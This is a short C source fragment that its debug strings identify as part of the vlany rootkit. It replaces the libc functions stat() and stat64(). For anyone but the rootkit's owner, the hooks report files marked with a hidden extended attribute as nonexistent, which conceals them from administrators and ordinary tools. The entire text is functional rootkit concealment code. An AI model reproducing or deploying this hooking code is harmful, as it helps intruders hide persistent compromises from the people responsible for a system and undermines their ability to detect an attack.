int stat(const char *pathname, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] stat() called\n");
    #endif

    HOOK(old_stat, CSTAT);

    if(owned()) return old_stat(pathname, buf);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_stat(pathname, buf);
}

int stat64(const char *pathname, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] stat64() called\n");
    #endif

    HOOK(old_stat64, CSTAT64);

    if(owned()) return old_stat64(pathname, buf);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_stat64(pathname, buf);
}
